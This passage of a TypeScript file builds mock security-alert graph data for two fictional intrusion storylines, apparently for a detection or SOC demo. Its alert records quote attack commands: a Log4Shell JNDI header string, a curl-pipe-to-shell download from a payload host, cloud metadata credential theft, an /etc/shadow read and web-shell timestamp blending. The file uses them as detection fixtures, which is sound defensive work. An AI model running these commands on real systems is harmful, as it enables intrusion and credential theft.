      flat: falconFlat({ host: 'WKS-3391', sev: 'Low', tactic: 'Credential Access', technique: 'Unsecured Credentials: Credentials In Files (T1552.001)', user: 'CORP\\dwhitfield', file: 'qd.exe', cmdline: 'qd.exe --lsass --ssh --browsers', sha: ID.HASH_QUILLDROP, ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T15:31:10Z', incident: 'inc-0091', extra: { files_read: ['C:\\Users\\dwhitfield\\.ssh\\id_ed25519', 'C:\\Users\\dwhitfield\\AppData\\Roaming\\FinOpsSync\\config.ini'] } }),
    },
    {
      id: ID.A006, title: 'Account and remote-system discovery', description: 'net group "Domain Admins" /domain, nltest /dclist:corp, arp -a, nslookup bas-01.shared.larkspur.internal.',
      source: 'falcon', type: 'detection', severity: 'informational', detected_at: '2026-09-09T15:40:00Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1087.002', 'T1018'], tactic: 'Discovery',
      storyline_id: S, score: 62, reasons: ['on attack path', 'resolved the bastion hostname'], reaches_crown_jewel: true, on_attack_path: true, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      flat: falconFlat({ host: 'WKS-3391', sev: 'Informational', tactic: 'Discovery', technique: 'Remote System Discovery (T1018)', user: 'CORP\\dwhitfield', file: 'cmd.exe', cmdline: 'cmd.exe /c net group "Domain Admins" /domain & nltest /dclist:corp & arp -a & nslookup bas-01.shared.larkspur.internal', parent: 'synchost.exe', ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T15:40:00Z', incident: 'inc-0091' }),
    },
    {
      id: ID.A007, title: 'Interactive SSH session from user workstation to bastion outside business hours', description: 'SSH from 10.40.12.77 (WKS-3391) to 10.20.0.15:22 with key auth as svc-finops-sftp, followed by an interactive shell for an SFTP-only account.',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-10T02:05:17Z', entity_id: ID.EP_BASTION, hostname: 'bas-01', user: 'svc-finops-sftp', techniques: ['T1021.004', 'T1078'], tactic: 'Lateral Movement',
      storyline_id: S, score: 84, reasons: ['lateral movement from compromised host', 'bastion reaches PCI', 'on attack path'], reaches_crown_jewel: true, on_attack_path: true, ti_actor_ids: actor, incident: ID.INCIDENT_BASTION,
      involves: [[P.SSH_SHELL, 'subject'], [ID.SVC_FINOPS_SFTP, 'subject'], [ID.CRED_SSH_KEY, 'credential']],
      flat: falconFlat({ host: 'bas-01', sev: 'Medium', tactic: 'Lateral Movement', technique: 'Remote Services: SSH (T1021.004)', user: 'svc-finops-sftp', file: 'sshd', cmdline: 'sshd: svc-finops-sftp [priv]', ip: '10.20.0.15', platform: 'Linux', ts: '2026-09-10T02:05:17Z', incident: 'inc-0094', extra: { source_ip: '10.40.12.77', auth_method: 'publickey', session_type: 'interactive' } }),
    },
    {
      id: ID.A008X, title: 'Read of /etc/shadow via sudo', description: 'sudo -l revealed a NOPASSWD misconfiguration; cat /etc/shadow followed.',
      source: 'falcon', type: 'detection', severity: 'low', detected_at: '2026-09-10T02:09:02Z', entity_id: ID.EP_BASTION, hostname: 'bas-01', user: 'svc-finops-sftp', techniques: ['T1003.008'], tactic: 'Credential Access',
      storyline_id: S, score: 76, reasons: ['on attack path', 'bastion reaches PCI'], reaches_crown_jewel: true, on_attack_path: true, ti_actor_ids: actor, incident: ID.INCIDENT_BASTION,
      involves: [[P.SSH_SHELL, 'subject']],
      flat: falconFlat({ host: 'bas-01', sev: 'Low', tactic: 'Credential Access', technique: '/etc/passwd and /etc/shadow (T1003.008)', user: 'svc-finops-sftp', file: 'cat', cmdline: 'sudo cat /etc/shadow', parent: 'bash -i', ip: '10.20.0.15', platform: 'Linux', ts: '2026-09-10T02:09:02Z', incident: 'inc-0094' }),
    },
    {
      id: ID.A009, title: 'Cloud instance metadata service credential access from interactive shell', description: 'curl to 169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole from an interactive shell returned temporary keys ASIA5LARKBASTION01Q7.',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-10T02:11:45Z', entity_id: ID.EP_BASTION, hostname: 'bas-01', user: 'svc-finops-sftp', techniques: ['T1552.005'], tactic: 'Credential Access',
      storyline_id: S, score: 92, reasons: ['reaches PCI (cardholder vault)', 'stolen credential used in cloud', 'on attack path', 'active TI: Cinder Jackal'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 0, ti_actor_ids: actor, incident: ID.INCIDENT_BASTION,
      involves: [[P.CURL_IMDS, 'subject'], [ID.CRED_BASTION_KEY, 'credential'], [ID.BASTION_ROLE, 'object']],
      flat: falconFlat({ host: 'bas-01', sev: 'Medium', tactic: 'Credential Access', technique: 'Unsecured Credentials: Cloud Instance Metadata API (T1552.005)', user: 'svc-finops-sftp', file: 'curl', cmdline: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole', parent: 'bash -i', ip: '10.20.0.15', platform: 'Linux', ts: '2026-09-10T02:11:45Z', incident: 'inc-0094', objective: 'Gain Access', extra: { os_version: 'Amazon Linux 2023', cloud_provider: 'AWS', cloud_instance_id: 'i-0b4571e2c9a8f3d01', confidence: 80 } }),
    },
    {
      id: ID.A017, title: 'API calls for role LarkspurProdDataReader from a new geolocation/ASN', description: 'Cloud anomaly detector: LarkspurProdDataReader called from 203.0.113.77 (AS64500, NL); previous 90 days only from AWS us-east-1.',
      source: 'cloud-anomaly', type: 'cloud', severity: 'low', detected_at: '2026-09-10T03:55:00Z', entity_id: ID.PROD_READER_ROLE, hostname: undefined, user: 'LarkspurProdDataReader', techniques: ['T1078.004', 'T1530'], tactic: 'Collection',
      storyline_id: S, score: 86, reasons: ['1,247 GetObject on PCI vault', 'credential derived from stolen IMDS key', 'egress IP matches Cinder Jackal IOC'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor,
      involves: [[ID.CRED_PROD_KEY, 'credential'], [ID.EGRESS_IP, 'source'], [ID.EVT('a014'), 'object'], [ID.EVT('a012'), 'object']],
      flat: { finding_id: 'ca-a017', finding_type: 'UnauthorizedAccess:IAMUser/AnomalousGeo', severity: 'Low (3.0)', resource_type: 'AssumedRole', principal: 'arn:aws:sts::111111111111:assumed-role/LarkspurProdDataReader/ember-sync', access_key_id: 'ASIA5LARKPRODREADER1', source_ip: '203.0.113.77', asn: 'AS64500 Stratovault Hosting', country: 'NL', city: 'Amsterdam', first_seen: '2026-09-10T02:26:00Z', last_seen: '2026-09-10T03:41:40Z', api_calls: 1251, description: 'API calls were made from a location and network not previously associated with this principal. This may indicate travel or a new VPN egress.', recommended_action: 'Verify with the principal owner.' },
    },
  ]
  alerts.forEach((a) => addAlert(g, a))
  g.edge(ID.CRED_SSH_KEY, 'STOLEN_BY', ID.A005, { method: 'file_read' }, 0.9)
  g.edge(ID.CRED_BASTION_KEY, 'STOLEN_BY', ID.A009, { method: 'imds' }, 0.95)
  for (const a of [ID.A001, ID.A002, ID.A003, ID.A004]) g.edge(a, 'ATTRIBUTED_TO', ID.CAMPAIGN_EMBERCAST, { basis: 'ioc' }, 0.9)
  g.edge(ID.A017, 'ATTRIBUTED_TO', ID.CAMPAIGN_EMBERCAST, { basis: 'ioc' }, 0.85)
  g.edge(ID.A001, 'MATCHES_IOC', ID.IOC_HASH_MAPLELOADER, { match_type: 'exact' }, 0.95)
  g.edge(ID.A002, 'MATCHES_IOC', ID.IOC_HASH_NIGHTFERRY, { match_type: 'exact' }, 0.95)
  g.edge(ID.A003, 'MATCHES_IOC', ID.IOC_C2_DOMAIN, { match_type: 'exact' }, 0.95)
  g.edge(ID.A004, 'MATCHES_IOC', ID.IOC_HASH_QUILLDROP, { match_type: 'exact' }, 0.9)
  g.edge(ID.A017, 'MATCHES_IOC', ID.IOC_EGRESS_IP, { match_type: 'exact' }, 0.85)
  // ordered kill chain
  const chain = [ID.A001, ID.A002, ID.A003, ID.A004, ID.A005, ID.A006, ID.A007, ID.A008X, ID.A009, ID.EVT('a010'), ID.EVT('a011'), ID.EVT('a012'), ID.EVT('a013'), ID.EVT('a014'), ID.EVT('a015'), ID.EVT('a016'), ID.A017]
  for (let i = 0; i < chain.length - 1; i++) g.edge(chain[i], 'NEXT_STAGE', chain[i + 1], { storyline_id: S, stage: i + 1 })
  return alerts
}

function buildCampaignB(g: MockGraph): AlertSpec[] {
  g.node(ID.SALTWORKS_IP, '203.0.113.99', { address: '203.0.113.99', is_private: false, asn: 'AS64511', asn_org: 'Brinehost Networks (fictional)', country: 'RO', reputation: 'malicious' })
  g.edge(ID.SALTWORKS_IP, 'MATCHES_IOC', ID.IOC_SALTWORKS_IP, { match_type: 'exact' }, 0.8)
  g.node(F.BRACKISH, '.b.jsp', { sha256: ID.HASH_BRACKISH, file_name: '.b.jsp', file_path: '/opt/statement-render/webapps/ROOT/.b.jsp', size_bytes: 3122, signed: false, malware_family: 'BRACKISH', verdict: 'malicious' })
  g.edge(F.BRACKISH, 'MATCHES_IOC', ID.IOC_HASH_BRACKISH, { match_type: 'exact' }, 0.85)
  g.node(P.JAVA, 'java', { endpoint_id: ID.EP_EDGE, pid: 2211, image_path: '/usr/lib/jvm/java-17/bin/java', command_line: 'java -jar /opt/statement-render/statement-render-3.8.1.jar --server.port=8080', user: 'stmtrender', signed: true, start_time: '2026-09-05T20:00:00Z', integrity_level: 'user' })
  g.node(P.BASH_B, 'bash', { endpoint_id: ID.EP_EDGE, pid: 30412, parent_process_id: P.JAVA, image_path: '/bin/bash', command_line: '/bin/bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh | sh"', user: 'stmtrender', signed: true, start_time: '2026-09-10T21:13:07Z', integrity_level: 'user' })
  g.edge(P.JAVA, 'RAN_ON', ID.EP_EDGE)
  g.edge(P.BASH_B, 'RAN_ON', ID.EP_EDGE)
  g.edge(P.JAVA, 'SPAWNED', P.BASH_B)
  g.edge(P.BASH_B, 'EXECUTED', F.BRACKISH, { action: 'wrote' })
  g.edge(P.BASH_B, 'CONNECTED_TO', ID.SALTWORKS_IP, { port: 8000, protocol: 'tcp', direction: 'outbound', count: 3, bytes_out: 1200, first_time: '2026-09-10T21:13:08Z', last_time: '2026-09-10T21:30:00Z' })
  g.node(ID.INCIDENT_EDGE, 'inc-0096', { vendor_severity: 'medium', status: 'new', start_time: '2026-09-10T21:13:07Z', end_time: '2026-09-10T21:13:19Z', alert_count: 2, hosts: ['stmt-render-2a'], description: 'Falcon incident on stmt-render-2a (ldt-b002, b003)' }, { label: 'Incident', severity: 'medium' })
  const S = ID.STORYLINE_B
  const actor = [ID.ACTOR_HT]
  const alerts: AlertSpec[] = [
    {
      id: ID.B001, title: 'JNDI injection pattern in request header', description: 'HTTP request to 198.51.100.24:8080 carried X-Api-Version: ${jndi:ldap://203.0.113.99:1389/o} from 203.0.113.99.',
      source: 'waf', type: 'network', severity: 'medium', detected_at: '2026-09-10T21:13:02Z', entity_id: ID.EDGE_VM, hostname: 'stmt-render-2a', techniques: ['T1595.002', 'T1190'], tactic: 'Initial Access',
      storyline_id: S, score: 72, reasons: ['target is vulnerable (log4j-core 2.14.1)', 'source IP matches Hollow Tide IOC', 'internet-exposed prod host'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor,
      involves: [[ID.SALTWORKS_IP, 'source'], [ID.LOG4SHELL, 'object']],
      flat: { rule_id: '942150-JNDI', rule_group: 'Java injection', action: 'LOG', severity: 'Medium', client_ip: '203.0.113.99', host: 'statements.larkspur.example', uri: '/render/v2/statement', method: 'POST', matched_header: 'X-Api-Version', matched_value: '${jndi:ldap://203.0.113.99:1389/o}', backend: '198.51.100.24:8080', timestamp: '2026-09-10T21:13:02Z', note: 'One of 2,312 exploit-pattern events this week' },
    },
    {
      id: ID.B002, title: 'Shell spawned by Java application server process', description: 'java (statement-render, pid 2211) spawned /bin/bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh | sh".',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-10T21:13:07Z', entity_id: ID.EP_EDGE, hostname: 'stmt-render-2a', user: 'stmtrender', techniques: ['T1190', 'T1059.004', 'T1105'], tactic: 'Execution',
      storyline_id: S, score: 80, reasons: ['mass-exploited CVE on internet-exposed host', 'active TI: Hollow Tide (sector 0.8)', 'role reaches app-config secrets -> cardholder-db'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 2, ti_actor_ids: actor, incident: ID.INCIDENT_EDGE,
      involves: [[P.BASH_B, 'subject'], [P.JAVA, 'subject'], [ID.SALTWORKS_IP, 'destination']],
      flat: falconFlat({ host: 'stmt-render-2a', sev: 'Medium', tactic: 'Execution', technique: 'Command and Scripting Interpreter: Unix Shell (T1059.004)', user: 'stmtrender', file: 'bash', cmdline: '/bin/bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh | sh"', parent: 'java -jar /opt/statement-render/statement-render-3.8.1.jar --server.port=8080', ip: '10.10.3.24', platform: 'Linux', ts: '2026-09-10T21:13:07Z', incident: 'inc-0096', extra: { ioa_name: 'Web server spawned shell with network download', remote_ip: '203.0.113.99', remote_port: 8000 } }),
    },
    {
      id: ID.B003, title: 'Web shell-like file written to web root', description: '/opt/statement-render/webapps/ROOT/.b.jsp written by the shell, chmod, touch -r to blend timestamps.',
      source: 'falcon', type: 'detection', severity: 'low', detected_at: '2026-09-10T21:13:19Z', entity_id: ID.EP_EDGE, hostname: 'stmt-render-2a', user: 'stmtrender', techniques: ['T1505.003'], tactic: 'Persistence',
      storyline_id: S, score: 70, reasons: ['IOC match (BRACKISH hash)', 'internet-exposed prod host', 'active TI: Hollow Tide'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor, incident: ID.INCIDENT_EDGE,
      involves: [[P.BASH_B, 'subject'], [F.BRACKISH, 'object']],
      flat: falconFlat({ host: 'stmt-render-2a', sev: 'Low', tactic: 'Persistence', technique: 'Server Software Component: Web Shell (T1505.003)', user: 'stmtrender', file: '.b.jsp', cmdline: 'sh -c "chmod 644 /opt/statement-render/webapps/ROOT/.b.jsp; touch -r index.jsp .b.jsp"', parent: '/bin/bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh | sh"', sha: ID.HASH_BRACKISH, ip: '10.10.3.24', platform: 'Linux', ts: '2026-09-10T21:13:19Z', incident: 'inc-0096' }),
    },
  ]
  alerts.forEach((a) => addAlert(g, a))
  g.edge(ID.B001, 'MATCHES_IOC', ID.IOC_SALTWORKS_IP, { match_type: 'exact' }, 0.8)
  g.edge(ID.B002, 'MATCHES_IOC', ID.IOC_BRACKISH_URL, { match_type: 'exact' }, 0.8)
  g.edge(ID.B002, 'MATCHES_IOC', ID.IOC_SALTWORKS_IP, { match_type: 'exact' }, 0.8)
  g.edge(ID.B003, 'MATCHES_IOC', ID.IOC_HASH_BRACKISH, { match_type: 'exact' }, 0.85)
  for (const a of [ID.B001, ID.B002, ID.B003]) g.edge(a, 'ATTRIBUTED_TO', ID.CAMPAIGN_SALTWORKS, { basis: 'ioc' }, 0.85)
  g.edge(ID.B001, 'NEXT_STAGE', ID.B002, { storyline_id: S, stage: 1 })
  g.edge(ID.B002, 'NEXT_STAGE', ID.B003, { storyline_id: S, stage: 2 })
  return alerts
}

function stage(order: number, name: string, techniques: string[], alerts: string[], nodes: string[], time: string, summary: string): StageOut {
  return { order, stage: name, technique_ids: techniques, node_ids: [...new Set([...alerts, ...nodes])], edge_ids: [], alert_ids: alerts, time, summary }
}

/** Fill in stage edge ids from the graph (edges among the stage's nodes plus the bridge to the previous stage). */
function wireStages(g: MockGraph, stages: StageOut[]): void {
  for (let i = 0; i < stages.length; i++) {
    const own = new Set(stages[i].node_ids)
    const prev = new Set(i > 0 ? stages[i - 1].node_ids : [])
    const ids = new Set<string>()
    for (const n of own) for (const e of g.edgesOf(n)) if ((own.has(e.src) && own.has(e.dst)) || (prev.has(e.src) && own.has(e.dst)) || (own.has(e.src) && prev.has(e.dst))) ids.add(e.id)
    stages[i].edge_ids = [...ids]
  }
}

function buildStorylineA(g: MockGraph): StorylineOut {
  const stages: StageOut[] = [
    stage(1, 'Initial access', ['T1566.001', 'T1204.002', 'T1059.001', 'T1218.011'], [ID.A001], [ID.WKS_DANA, ID.USER_DANA, P.POWERSHELL, P.RUNDLL, F.MAPLE], '2026-09-09T09:12:04Z', 'Dana Whitfield opened Remittance_Viewer.lnk inside a mounted ISO; hidden PowerShell ran rundll32 on MAPLELOADER.'),
    stage(2, 'Persistence & C2', ['T1547.001', 'T1055', 'T1071.001', 'T1573.002'], [ID.A002, ID.A003], [P.SYNCHOST, F.NIGHT, ID.C2_DOMAIN, ID.C2_IP, ID.IOC_C2_DOMAIN], '2026-09-09T09:14:30Z', 'NIGHTFERRY installed under a Run key and beaconed to cdn-metrics.telemetry-sync.net, a Cinder Jackal IOC.'),
    stage(3, 'Credential access', ['T1003.001', 'T1552.001', 'T1087.002', 'T1018'], [ID.A004, ID.A005, ID.A006], [P.QD, F.QUILL, ID.CRED_SSH_KEY, ID.SVC_FINOPS_SFTP], '2026-09-09T15:22:41Z', 'QUILLDROP dumped LSASS and read Dana\'s SSH key plus the FinOpsSync config pointing at bas-01.'),
    stage(4, 'Lateral movement', ['T1021.004', 'T1078', 'T1003.008', 'T1552.005'], [ID.A007, ID.A008X, ID.A009], [ID.EP_BASTION, ID.BASTION_VM, P.SSH_SHELL, P.CURL_IMDS, ID.CRED_BASTION_KEY], '2026-09-10T02:05:17Z', 'SSH as svc-finops-sftp into bas-01 (a cloud VM), then IMDS credential theft for LarkspurBastionSSMRole.'),
    stage(5, 'Cloud API abuse', ['T1078.004', 'T1580'], [], [ID.EVT('a010'), ID.EVT('a011'), ID.EGRESS_IP, ID.BASTION_ROLE, ID.IOC_EGRESS_IP], '2026-09-10T02:20:31Z', 'Stolen instance-role keys used from 203.0.113.77 (AS64500): GetCallerIdentity, then denied bucket and role enumeration.'),
    stage(6, 'Privilege escalation', ['T1548.005'], [], [ID.EVT('a012'), ID.PROD_READER_ROLE, ID.CRED_PROD_KEY], '2026-09-10T02:24:15Z', 'Cross-account sts:AssumeRole into LarkspurProdDataReader (session ember-sync).'),
    stage(7, 'Collection & exfiltration', ['T1530', 'T1567.002'], [ID.A017], [ID.EVT('a013'), ID.EVT('a014'), ID.EVT('a015'), ID.EVT('a016'), ID.CARDHOLDER_VAULT, ID.DB_READER_SECRET, ID.HSM_SECRET], '2026-09-10T02:26:00Z', '1,247 GetObject calls (~38 GB) on larkspur-cardholder-vault and two secrets read; a low cloud-anomaly alert was the only signal.'),
  ]
  wireStages(g, stages)
  const summary = 'Cinder Jackal (EMBERCAST) phished a treasury analyst, harvested her SSH key, pivoted to the bas-01 bastion, stole instance-role credentials from IMDS, assumed LarkspurProdDataReader cross-account and pulled ~38 GB from the PCI cardholder vault plus two secrets. The EDR saw stages 1-4 as two unrelated medium incidents; the cloud saw stages 5-7 as valid API calls.'
  g.node(ID.STORYLINE_A, 'EMBERCAST intrusion: workstation to cardholder vault', { title: 'EMBERCAST intrusion: workstation to cardholder vault', summary, actor_id: ID.ACTOR_CJ, campaign_id: ID.CAMPAIGN_EMBERCAST, stage_count: 7, alert_ids: [ID.A001, ID.A002, ID.A003, ID.A004, ID.A005, ID.A006, ID.A007, ID.A008X, ID.A009, ID.A017], crown_jewels_reached: [ID.CARDHOLDER_VAULT, ID.KYC_DOCS, ID.CARDHOLDER_DB], first_event: '2026-09-09T09:12:04Z', last_event: '2026-09-10T03:55:00Z', contextual_score: 92 }, { label: 'Storyline', score: 92 })
  g.edge(ID.STORYLINE_A, 'ATTRIBUTED_TO', ID.CAMPAIGN_EMBERCAST, { basis: 'ioc' }, 0.9)
  g.edge(ID.STORYLINE_A, 'ATTRIBUTED_TO', ID.ACTOR_CJ, { basis: 'ioc' }, 0.9)
  for (const s of stages) for (const n of s.node_ids) if (g.has(n) && !n.startsWith('ioc:')) g.edge(n, 'IN_STORYLINE', ID.STORYLINE_A, { stage: s.order, role: n.startsWith('alert:') ? 'alert' : 'entity' })
  return {
    id: ID.STORYLINE_A,
    title: 'EMBERCAST intrusion: workstation to cardholder vault',
    summary,
    actor_id: ID.ACTOR_CJ, actor_name: 'Cinder Jackal', campaign_id: ID.CAMPAIGN_EMBERCAST, campaign_name: 'EMBERCAST',
    contextual_score: 92, stage_count: 7,
    alert_ids: [ID.A001, ID.A002, ID.A003, ID.A004, ID.A005, ID.A006, ID.A007, ID.A008X, ID.A009, ID.A017],
    crown_jewels_reached: [ID.CARDHOLDER_VAULT, ID.KYC_DOCS, ID.CARDHOLDER_DB],
    first_event: '2026-09-09T09:12:04Z', last_event: '2026-09-10T03:55:00Z',
    stages,
    fragment: null,
  }
}

function buildStorylineB(g: MockGraph): StorylineOut {
  const stages: StageOut[] = [
    stage(1, 'Exploit public-facing app', ['T1595.002', 'T1190'], [ID.B001], [ID.EDGE_VM, ID.INTERNET, ID.SALTWORKS_IP, ID.LOG4SHELL, ID.EDGE_LOG4J_PACKAGE], '2026-09-10T21:13:02Z', 'JNDI exploit string against the internet-exposed statement renderer running log4j-core 2.14.1.'),
    stage(2, 'Execution & tool transfer', ['T1059.004', 'T1105'], [ID.B002], [ID.EP_EDGE, P.JAVA, P.BASH_B, ID.IOC_SALTWORKS_IP], '2026-09-10T21:13:07Z', 'The Java server spawned a shell that fetched brackish.sh from the Hollow Tide payload host.'),
    stage(3, 'Persistence (web shell)', ['T1505.003'], [ID.B003], [F.BRACKISH, ID.EDGE_ROLE, ID.APP_CONFIG_BUCKET, ID.CARDHOLDER_DB], '2026-09-10T21:13:19Z', 'BRACKISH JSP webshell written to the web root. No cloud API use yet, but the instance role reads app-config (DB credentials) unlocking cardholder-db.'),
  ]
  wireStages(g, stages)
  const summary = 'Hollow Tide (SALTWORKS) mass-exploited Log4Shell on the internet-exposed stmt-render-2a and dropped the BRACKISH webshell. No cloud activity yet, but the instance role can read prod-app-config, which holds credentials for the PCI cardholder database.'
  g.node(ID.STORYLINE_B, 'SALTWORKS: Log4Shell foothold on statement renderer', { title: 'SALTWORKS: Log4Shell foothold on statement renderer', summary, actor_id: ID.ACTOR_HT, campaign_id: ID.CAMPAIGN_SALTWORKS, stage_count: 3, alert_ids: [ID.B001, ID.B002, ID.B003], crown_jewels_reached: [ID.CARDHOLDER_DB], first_event: '2026-09-10T21:13:02Z', last_event: '2026-09-10T21:30:00Z', contextual_score: 80 }, { label: 'Storyline', score: 80 })
  g.edge(ID.STORYLINE_B, 'ATTRIBUTED_TO', ID.CAMPAIGN_SALTWORKS, { basis: 'ioc' }, 0.85)
  g.edge(ID.STORYLINE_B, 'ATTRIBUTED_TO', ID.ACTOR_HT, { basis: 'ioc' }, 0.85)
  for (const s of stages) for (const n of s.node_ids) if (g.has(n) && !n.startsWith('ioc:') && n !== ID.INTERNET) g.edge(n, 'IN_STORYLINE', ID.STORYLINE_B, { stage: s.order, role: n.startsWith('alert:') ? 'alert' : 'entity' })
  return {
    id: ID.STORYLINE_B,
    title: 'SALTWORKS: Log4Shell foothold on statement renderer',
    summary,
    actor_id: ID.ACTOR_HT, actor_name: 'Hollow Tide', campaign_id: ID.CAMPAIGN_SALTWORKS, campaign_name: 'SALTWORKS',
    contextual_score: 80, stage_count: 3,
    alert_ids: [ID.B001, ID.B002, ID.B003],
    crown_jewels_reached: [ID.CARDHOLDER_DB],
    first_event: '2026-09-10T21:13:02Z', last_event: '2026-09-10T21:30:00Z',
    stages,
    fragment: null,
  }
}

export const PROCESS_IDS = P
export const FILE_IDS = F
